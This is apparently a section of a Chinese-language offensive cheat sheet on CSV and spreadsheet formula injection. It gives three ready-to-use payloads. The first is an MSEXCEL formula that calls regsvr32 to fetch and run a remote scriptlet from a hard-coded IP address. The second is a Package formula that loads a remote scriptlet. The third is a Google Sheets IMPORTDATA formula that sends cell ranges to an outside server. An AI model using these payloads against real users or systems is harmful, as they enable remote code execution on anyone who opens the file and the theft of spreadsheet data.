# 其他利用方式

### Package 方式 #1

以 `MSEXCEL` 包为例，新建CSV文档，内容类似下面

```
fillerText1,fillerText2,fillerText3,=MSEXCEL|'\..\..\..\Windows\System32\regsvr32 /s /n /u /i:http://192.168.154.200/cmd.sct scrobj.dll'!''
```

用户确认后可执行代码

### Package 方式 #2

[参考文章: When Scriptlets Attack: Excel’s Alternative to DDE Code Execution](https://www.lastline.com/labsblog/when-scriptlets-attack-excels-alternative-to-dde-code-execution/)

此方法可通过 Excel 加载 scriptlet

```
=Package|'scRiPt:http://XXXX/XXXX.xml'!""
```

### IMPORTDATA 后门

[参考文章: Server-Side Spreadsheet Injection – Formula Injection to Remote Code Execution](https://www.bishopfox.com/blog/2018/06/server-side-spreadsheet-injections/)

此方法只适合 Google Sheets，且随时可能修复

```
=IFERROR(IMPORTDATA(CONCAT("http://127.0.0.1:8000/save/",JOIN(",",B3:B18,C3:C18,D3:D18
,E3:E18,F3:F18,G3:G18,H3:H18,I3:I18,J3:J18,K3:K18,L3:L18,M3:M18,N3:N18,O3:O18,P3:P18,Q3:Q18,R3:R18))),"")
```

